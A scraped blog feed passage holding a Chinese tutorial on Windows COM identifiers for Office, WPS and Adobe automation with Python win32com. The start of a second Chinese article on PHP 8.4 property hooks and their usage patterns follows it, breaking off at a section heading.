    <span class="hljs-comment"># 其他办公软件</span>
    <span class="hljs-string">"Photoshop.Application"</span>: <span class="hljs-string">"Adobe Photoshop"</span>,
    <span class="hljs-string">"AcroExch.App"</span>: <span class="hljs-string">"Adobe Acrobat"</span>,
}
</code></pre>
<p>上面是一个办公软件的“地图”，这些是 <strong>Windows</strong> 平台上办公软件的 COM 接口标识符。</p>
<h3 data-id="heading-2">什么是 COM？</h3>
<p>COM（Component Object Model，组件对象模型）是微软在 1990 年代开发的一种二进制接口标准。它允许不同编程语言编写的软件组件进行通信。简单来说，COM 让程序可以通过一个“代号”<strong>调用其他软件的功能</strong>。</p>
<h3 data-id="heading-3">办公软件</h3>
<h4 data-id="heading-4">1. 微软 Office 家族</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"Word.Application"</span>: <span class="hljs-string">"Microsoft Word"</span>          <span class="hljs-comment"># 文字处理</span>
<span class="hljs-string">"Excel.Application"</span>: <span class="hljs-string">"Microsoft Excel"</span>        <span class="hljs-comment"># 电子表格</span>
<span class="hljs-string">"PowerPoint.Application"</span>: <span class="hljs-string">"Microsoft PowerPoint"</span>  <span class="hljs-comment"># 演示文稿</span>
<span class="hljs-string">"Outlook.Application"</span>: <span class="hljs-string">"Microsoft Outlook"</span>    <span class="hljs-comment"># 邮件管理</span>
</code></pre>
<p>微软 Office 是最经典的办公套件，它的 COM 接口命名最为规范：</p>
<ul>
<li>每个应用都有自己独立的 Application 对象</li>
<li>命名直接明了：<code>软件名.Application</code></li>
<li>提供了最完整的编程接口</li>
</ul>
<p><strong>有趣的事实</strong>：通过 COM 接口，你可以用 <strong>Python</strong>等 自动生成报告、处理数据、制作 PPT，实现办公自动化。</p>
<h4 data-id="heading-5">2. 金山 WPS 家族</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"wps.Application"</span>: <span class="hljs-string">"WPS Office (新版)"</span>,       <span class="hljs-comment"># 统一入口</span>
<span class="hljs-string">"Kwps.Application"</span>: <span class="hljs-string">"WPS 文字"</span>,              <span class="hljs-comment"># 文字处理</span>
<span class="hljs-string">"Kwpp.Application"</span>: <span class="hljs-string">"WPS 演示"</span>,               <span class="hljs-comment"># 演示文稿</span>
<span class="hljs-string">"Ket.Application"</span>: <span class="hljs-string">"WPS 表格"</span>                <span class="hljs-comment"># 电子表格</span>
</code></pre>
<p>WPS 的命名规则很有意思：</p>
<ul>
<li><strong>K</strong> 代表金山（Kingsoft）</li>
<li><strong>wps</strong> 是核心应用</li>
<li><strong>wpp</strong> 对应 PowerPoint</li>
<li><strong>ket</strong> 对应 Excel</li>
</ul>
<p>WPS 提供了两种调用方式：</p>
<ul>
<li>统一接口：<code>wps.Application</code>（新版本）</li>
<li>独立应用：分别调用文字、演示、表格</li>
</ul>
<p><strong>版本演变</strong>：从独立的 <code>Kwps</code>、<code>Kwpp</code>、<code>Ket</code>到统一的 <code>wps.Application</code>。</p>
<h4 data-id="heading-6">3. Adobe 专业工具</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"Photoshop.Application"</span>: <span class="hljs-string">"Adobe Photoshop"</span>    <span class="hljs-comment"># 图像处理</span>
<span class="hljs-string">"AcroExch.App"</span>: <span class="hljs-string">"Adobe Acrobat"</span>               <span class="hljs-comment"># PDF 处理</span>
</code></pre>
<p>Adobe 系列是设计领域的标杆：</p>
<ul>
<li>Photoshop 的接口相对独立</li>
<li>Acrobat 使用的是 <code>AcroExch.App</code>这个特殊的名字</li>
<li>主要用于专业设计、PDF 处理等场景</li>
</ul>
<h3 data-id="heading-7">实际应用场景</h3>
<h4 data-id="heading-8">自动化办公</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> win32com.client
​
<span class="hljs-comment"># 自动生成 Word 报告</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_report</span>():
    <span class="hljs-comment"># 尝试 WPS，失败则用 Word</span>
    <span class="hljs-keyword">for</span> app_name <span class="hljs-keyword">in</span> [<span class="hljs-string">"wps.Application"</span>, <span class="hljs-string">"Kwps.Application"</span>, <span class="hljs-string">"Word.Application"</span>]:
        <span class="hljs-keyword">try</span>:
            word = win32com.client.Dispatch(app_name)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"使用: <span class="hljs-subst">{app_name}</span>"</span>)
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    doc = word.Documents.Add()
    <span class="hljs-comment"># ... 添加内容、格式、图表 ...</span>
    doc.SaveAs(<span class="hljs-string">"月报.docx"</span>)
    word.Quit()
</code></pre>
<h4 data-id="heading-9">批量文档转换</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_docs_to_pdf</span>(<span class="hljs-params">input_folder, output_folder</span>):
    <span class="hljs-string">"""批量将文档转换为 PDF"""</span>
    <span class="hljs-keyword">import</span> os
    
    <span class="hljs-comment"># 检测可用应用</span>
    <span class="hljs-keyword">for</span> app_id <span class="hljs-keyword">in</span> [<span class="hljs-string">"wps.Application"</span>, <span class="hljs-string">"Word.Application"</span>]:
        <span class="hljs-keyword">try</span>:
            app = win32com.client.Dispatch(app_id)
            app.Visible = <span class="hljs-literal">False</span>
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> os.listdir(input_folder):
        <span class="hljs-keyword">if</span> file.endswith((<span class="hljs-string">'.doc'</span>, <span class="hljs-string">'.docx'</span>)):
            doc_path = os.path.join(input_folder, file)
            pdf_path = os.path.join(output_folder, file.replace(<span class="hljs-string">'.docx'</span>, <span class="hljs-string">'.pdf'</span>))
            
            doc = app.Documents.Open(doc_path)
            doc.ExportAsFixedFormat(pdf_path, <span class="hljs-number">17</span>)  <span class="hljs-comment"># 17 表示 PDF</span>
            doc.Close()
    
    app.Quit()
</code></pre>
<h4 data-id="heading-10">智能应用检测</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect_office_software</span>():
    <span class="hljs-string">"""检测系统安装的办公软件"""</span>
    results = {
        <span class="hljs-string">"microsoft_office"</span>: [],
        <span class="hljs-string">"wps_office"</span>: [],
        <span class="hljs-string">"adobe"</span>: []
    }
    
    <span class="hljs-keyword">for</span> prog_id, app_name <span class="hljs-keyword">in</span> office_apps.items():
        <span class="hljs-keyword">try</span>:
            app = win32com.client.Dispatch(prog_id)
            version = <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">"Version"</span>, <span class="hljs-string">"未知"</span>)
            
            <span class="hljs-keyword">if</span> <span class="hljs-string">"Word"</span> <span class="hljs-keyword">in</span> app_name <span class="hljs-keyword">or</span> <span class="hljs-string">"Excel"</span> <span class="hljs-keyword">in</span> app_name <span class="hljs-keyword">or</span> <span class="hljs-string">"PowerPoint"</span> <span class="hljs-keyword">in</span> app_name:
                results[<span class="hljs-string">"microsoft_office"</span>].append(<span class="hljs-string">f"<span class="hljs-subst">{app_name}</span> (v<span class="hljs-subst">{version}</span>)"</span>)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">"WPS"</span> <span class="hljs-keyword">in</span> app_name:
                results[<span class="hljs-string">"wps_office"</span>].append(<span class="hljs-string">f"<span class="hljs-subst">{app_name}</span> (v<span class="hljs-subst">{version}</span>)"</span>)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">"Photoshop"</span> <span class="hljs-keyword">in</span> app_name <span class="hljs-keyword">or</span> <span class="hljs-string">"Acrobat"</span> <span class="hljs-keyword">in</span> app_name:
                results[<span class="hljs-string">"adobe"</span>].append(<span class="hljs-string">f"<span class="hljs-subst">{app_name}</span> (v<span class="hljs-subst">{version}</span>)"</span>)
                
            app.Quit()
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">return</span> results
</code></pre>
<h3 data-id="heading-11">应用场景</h3>
<h4 data-id="heading-12">自动化办公</h4>
<ul>
<li>批量处理文档</li>
<li>自动生成报告</li>
<li>数据整理和分析</li>
</ul>
<h4 data-id="heading-13">软件集成</h4>
<ul>
<li>在自家软件中嵌入 Office 功能</li>
<li>实现文档预览、编辑</li>
<li>提供格式转换服务</li>
</ul>
<h4 data-id="heading-14">企业应用开发</h4>
<ul>
<li>企业内部系统集成</li>
<li>工作流自动化</li>
<li>文档管理系统</li>
</ul>
<h3 data-id="heading-15">技术细节</h3>
<h4 data-id="heading-16">COM 接口的原理</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建应用实例</span>
<span class="hljs-attr">app</span> = win32com.client.Dispatch(<span class="hljs-string">"Word.Application"</span>)
​
<span class="hljs-comment"># 调用方法</span>
<span class="hljs-attr">app.Visible</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 显示界面</span>
app.Documents.Open("test.docx")  <span class="hljs-comment"># 打开文档</span>
​
<span class="hljs-comment"># 访问属性</span>
<span class="hljs-attr">version</span> = app.Version  <span class="hljs-comment"># 获取版本</span>
</code></pre>
<h4 data-id="heading-17">错误处理</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_dispatch</span>(<span class="hljs-params">app_name</span>):
    <span class="hljs-string">"""安全创建 COM 对象"""</span>
    <span class="hljs-keyword">try</span>:
        app = win32com.client.Dispatch(app_name)
        <span class="hljs-keyword">return</span> app
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"无法创建 <span class="hljs-subst">{app_name}</span>: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h3 data-id="heading-18">实用技巧</h3>
<h4 data-id="heading-19">版本兼容</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 优先尝试新版，然后回退</span>
<span class="hljs-attr">wps_progids</span> = [
    <span class="hljs-string">"wps.Application"</span>,    <span class="hljs-comment"># 新版</span>
    <span class="hljs-string">"Kwps.Application"</span>,   <span class="hljs-comment"># 旧版</span>
    <span class="hljs-string">"ket.Application"</span>,    <span class="hljs-comment"># 表格专用</span>
]
​
for progid in wps_progids:
    try:
        <span class="hljs-attr">wps</span> = win32com.client.Dispatch(progid)
        break
    except:
        continue
</code></pre>
<h4 data-id="heading-20">功能检测</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_feature_support</span>(<span class="hljs-params">app</span>):
    <span class="hljs-string">"""检测应用功能支持"""</span>
    features = {
        <span class="hljs-string">"export_pdf"</span>: <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">"ExportAsFixedFormat"</span>),
        <span class="hljs-string">"save_as"</span>: <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">"SaveAs2"</span>),
        <span class="hljs-string">"visible"</span>: <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">"Visible"</span>),
    }
    <span class="hljs-keyword">return</span> features
</code></pre>
<h3 data-id="heading-21">总结</h3>
<ol>
<li>COM 接口是 Windows 平台的标准化通信方式</li>
<li>WPS 的接口设计考虑了与 Office 的兼容</li>
<li>这些接口是自动化办公的基础</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性]]></title>    <link>https://juejin.cn/post/7594302398686674998</link>    <guid>https://juejin.cn/post/7594302398686674998</guid>    <pubDate>2026-01-12T23:15:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594302398686674998" data-draft-id="7594322573452738603" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2026-01-12T23:15:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T23:15:51.000Z" title="Mon Jan 12 2026 23:15:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性</h2>
<h3 data-id="heading-1">为什么 PHP 8.4 在 2026 年仍然相关</h3>
<p>如果你的团队计划"今年上 PHP 8.5"，很可能会先聊到 PHP 8.4——不管你愿不愿意。</p>
<p>无聊但重要的原因是：支持窗口。</p>
<p>根据官方 PHP 支持时间表，PHP 8.4（2024 年 11 月 21 日发布）仍处于活跃支持期，直到 2026 年 12 月 31 日，安全修复持续到 2028 年 12 月 31 日。</p>
<p>这让 8.4 在 2026 年初成为一个合理的基线，特别是对于从 8.2/8.3 升级、想避免"跳太远、坏太多"的团队。</p>
<p>但有意思的原因是技术层面的：PHP 8.4 悄悄重塑了日常 OOP 风格。它引入的特性减少了样板代码，让"干净的 DTO"和"安全的领域对象"更像是语言原生支持的东西：</p>
<ul>
<li>Property hooks（头条功能）</li>
<li>非对称属性可见性（读起来是 public，写起来是 private）</li>
<li>一些生活质量改进（数组、弃用工具、DOM 等）</li>
</ul>
<p>如果你在 8.4 上内化了这些，升级到 8.5 往往感觉像"添加一些好东西"，而不是"把整个 PHP 写法现代化"。</p>
<p>所以这篇文章可以当作基线知识：如果你还没上 8.4，这是你为 8.5 做准备应该知道的——但不会变成完整的升级清单。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fphp-3-biggest-strengths-2026" target="_blank" title="https://catchadmin.com/post/2026-01/php-3-biggest-strengths-2026" ref="nofollow noopener noreferrer">原文 2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性</a></p>
<h3 data-id="heading-2">Property hooks：是什么、为什么重要、什么时候值得用</h3>
<p>Property hooks 是 PHP 8.4 引入的。</p>
<p>它让你可以直接在属性上附加 get 和/或 set 逻辑。可以理解为"访问器方法"，但不需要写：</p>
<ul>
<li><code>getFoo(): string</code></li>
<li><code>setFoo(string $foo): void</code></li>
<li>加上私有的 backing 字段</li>
<li>加上在构造函数和工厂里重复的额外不变量</li>
</ul>
<h4 data-id="heading-3">心智模型</h4>
<p>带 hook 的属性仍然是属性。你还是用正常方式读写它：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$user</span>-&gt;email = <span class="hljs-string">"  ADMIN@EXAMPLE.COM  "</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>-&gt;email;
</code></pre>
<p>但在底层，引擎把读写路由到 hook。</p>
<p>完整形式的 hook 长这样：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$modified</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$foo</span> = <span class="hljs-string">'default value'</span> {
        get {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;modified) {
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;foo . <span class="hljs-string">' (modified)'</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;foo;
        }
        <span class="hljs-title function_ invoke__">set</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;foo = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-variable language_">$this</span>-&gt;modified = <span class="hljs-literal">true</span>;
        }
    }
}
</code></pre>
<p>这是手册里的示例，展示了核心思想：保留属性语法，同时获得集中化的行为。</p>
<h4 data-id="heading-4">Backed property vs virtual property（容易漏掉的部分）</h4>
<p>Property hooks 可以创建两"种"属性：</p>
<ul>
<li><strong>Backed property</strong>：在对象中有存储的内存（普通属性），hook 操作 backing value。</li>
<li><strong>Virtual property</strong>：没有 backing 存储——是派生/计算的，像伪装成 <code>$area</code> 的 <code>getArea()</code>。</li>
</ul>
<p>手册解释说，如果两个 hook 都没有用精确语法引用 <code>$this-&gt;propertyName</code>，属性就是 virtual 的，virtual 属性不占内存空间。</p>
<p>一个干净的 virtual property 示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rectangle</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$h</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$w</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$area</span> {
        get =&gt; <span class="hljs-variable language_">$this</span>-&gt;h * <span class="hljs-variable language_">$this</span>-&gt;w;
    }
}
<span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>-&gt;area;     <span class="hljs-comment">// 20</span>
<span class="hljs-variable">$r</span>-&gt;area = <span class="hljs-number">30</span>;     <span class="hljs-comment">// Error: no set operation defined</span>
</code></pre>
<p>这基本上是一个计算型 getter——但读起来像属性。</p>
<h4 data-id="heading-5">最有用的实际模式</h4>
<p>专注于真正能减少 bug 和样板代码的模式。</p>
<p><strong>模式 A：在 setter 中规范化输入（trim、大小写转换等）</strong></p>
<p>经典场景：邮箱、用户名、slug。你想接受杂乱输入但存储规范化的值。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserProfile</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span> {
        set =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
    }
}
</code></pre>
<p>在简写形式中，表达式结果成为存储的 backing value。</p>
<p>这已经很有用了，但生产代码通常还需要验证。</p>
<p><strong>模式 B：在边界处验证不变量（尽早抛出）</strong></p>
<p>例如，强制"用户名至少 3 个字符"并规范化空格。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserProfile</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$username</span> {
        set {
            <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> === <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Username cannot be empty.'</span>);
            }
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>) &lt; <span class="hljs-number">3</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Username is too short.'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$v</span>;
        }
    }
}
</code></pre>
<p>这让不变量紧挨着属性，而不是散落在控制器、请求验证器和构造函数各处。</p>
<p>PHP 迁移指南甚至展示了类似的"验证然后赋值"模式。</p>
<p><strong>模式 C：派生/virtual 的"展示"属性</strong></p>
<p>常见的 DTO 需求：暴露 fullName 但不存储它。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$first</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$last</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$fullName</span> {
        get =&gt; <span class="hljs-string">"<span class="hljs-subst">{$this-&gt;first}</span> <span class="hljs-subst">{$this-&gt;last}</span>"</span>;
    }
}
</code></pre>
<p>Virtual property 最适合的场景：</p>
<ul>
<li>确定性的，</li>
<li>计算成本低，</li>
<li>你永远不想"set"它们。</li>
</ul>
<p>对于历史上滥用魔术 <code>__get()</code> 的团队，这是一个干净的基线。</p>
<p><strong>模式 D："计算一次，之后缓存"（谨慎使用）</strong></p>
<p>有时计算值很昂贵（解析、构建对象）。你可以在对象内部缓存它。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RequestContext</span>
</span>{
    <span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$cachedClaims</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$jwt</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$claims</span> {
        get {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;cachedClaims !== <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cachedClaims;
            }
            <span class="hljs-comment">// 假设 parseJwt() 做签名检查、base64 解码等</span>
            <span class="hljs-variable language_">$this</span>-&gt;cachedClaims = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseJwt</span>(<span class="hljs-variable">$this</span>-&gt;jwt);
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cachedClaims;
        }
    }
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseJwt</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$jwt</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-comment">// ...</span>
        <span class="hljs-keyword">return</span> [];
    }
}
</code></pre>
<p>这很方便，但也是 hook 可能变得"太魔法"的地方。如果你把重活藏在 <code>$obj-&gt;claims</code> 后面，可能会让调用者意外。只在人体工学真正超过成本时使用这个模式。</p>
<h4 data-id="heading-6">Hooks + 构造函数提升：一个微妙的坑</h4>
